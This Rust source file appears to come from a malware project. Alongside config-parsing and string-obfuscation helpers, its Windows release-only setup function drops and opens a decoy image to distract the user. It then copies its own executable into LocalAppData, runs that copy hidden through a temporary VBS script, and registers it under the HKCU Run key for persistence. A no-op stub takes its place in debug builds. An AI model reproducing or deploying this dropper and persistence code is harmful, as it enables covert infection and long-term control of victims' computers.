use crate::{constant::*, ternary};
use rand::{prelude::SliceRandom, Rng};
use std::str::FromStr;
use std::{collections::HashMap, error};

pub type ConfigMap = HashMap<String, String>;
pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
pub type ConfigMapValueList<T> = Vec<T>;

pub trait ConfigParser<'a> {
  fn parse<T>(&self, key: &'a str) -> T
  where
    T: ToString + FromStr + Default;

  fn parse_vec<T>(&self, key: &'a str) -> Vec<T>
  where
    T: ToString + FromStr + Default;
}

impl<'a> ConfigParser<'a> for ConfigMap {
  fn parse<T>(&self, key: &'a str) -> T
  where
    T: ToString + FromStr + Default,
  {
    return self
      .get(key)
      .unwrap_or(&"".to_string())
      .parse::<T>()
      .unwrap_or_default();
  }

  fn parse_vec<T>(&self, key: &'a str) -> Vec<T>
  where
    T: ToString + FromStr,
  {
    self
      .get(key)
      .unwrap_or(&"".to_string())
      .split(",")
      .filter_map(|i| ternary!(i.is_empty(), None, i.parse::<T>().ok()))
      .collect()
  }
}

pub fn get_random_item<T>(items: &Vec<T>) -> &T {
  items.choose(&mut rand::thread_rng()).unwrap()
}

pub fn gen_random_bytes(length: usize) -> Vec<u8> {
  let mut rng = rand::thread_rng();

  vec![0; rng.gen_range(0, length) as usize]
    .iter()
    .map(|_| rng.gen::<u8>())
    .collect()
}

pub fn decrypt(s: &str) -> String {
  let can_decrypt = !s
    .chars()
    .into_iter()
    .any(|c| (c as u8) < ENCRYPTION_CHAR_SHIFT);

  if can_decrypt {
    return s
      .chars()
      .map(|c| (c as u8 - ENCRYPTION_CHAR_SHIFT as u8) as char)
      .collect::<String>();
  } else {
    return s.into();
  }
}

pub fn encrypt(s: &str) -> String {
  return s
    .chars()
    .map(|c| (c as u8 + ENCRYPTION_CHAR_SHIFT as u8) as char)
    .collect::<String>();
}

pub fn parse_config(s: &str) -> ConfigMap {
  let parsed: ConfigMap = s
    .split(CONFIG_SEPARATOR)
    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
    .collect::<Vec<Vec<&str>>>()
    .iter()
    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
      if pair.len() == 2 {
        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
      };
      return conf;
    });

  return parsed;
}

pub fn uppercase_first_letter(s: &str) -> String {
  let mut c = s.chars();
  match c.next() {
    None => String::new(),
    Some(f) => f.to_uppercase().collect::<String>() + c.as_str(),
  }
}

#[cfg(all(not(debug_assertions), target_os = "windows"))]
pub fn setup(name: &str) -> Result<()> {
  use dirs::{data_local_dir, picture_dir};
  use std::{
    fs,
    process::{exit, Command},
  };

  let current_path = std::env::current_exe()?;
  let local_data_path = data_local_dir().unwrap();
  let file_name = current_path.file_name().unwrap();
  let target_path = local_data_path.join(format!("{}.exe", name));
  let vbs_path = local_data_path.join(format!("{}.vbs", name));
  let mut image_path = picture_dir().unwrap().join(&file_name);

  image_path.set_extension("jpg");

  if current_path == target_path {
    return Ok(());
  }

  // Copy image and open
  {
    fs::write(&image_path, PLACEHOLDER_BUF)?;
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {}", 0, false
    "#,
      image_path.display()
    );

    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;

    fs::copy(&current_path, &target_path)?;
  }

  // Run add and register as autorun
  {
    let vbs_content = format!(
      r#"
      Set oShell = CreateObject("Wscript.Shell")
      oShell.Run "cmd /c {target_path}", 0, false
      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{reg_name}","{target_path}","REG_SZ"
    "#,
      reg_name = name,
      target_path = target_path.display()
    );
    fs::write(&vbs_path, &vbs_content)?;
    Command::new("wscript").arg(&vbs_path).output()?;
    fs::remove_file(&vbs_path)?;
  }

  exit(0);
}

#[cfg(debug_assertions)]
pub fn setup(_: &str) -> Result<()> {
  Ok(())
}
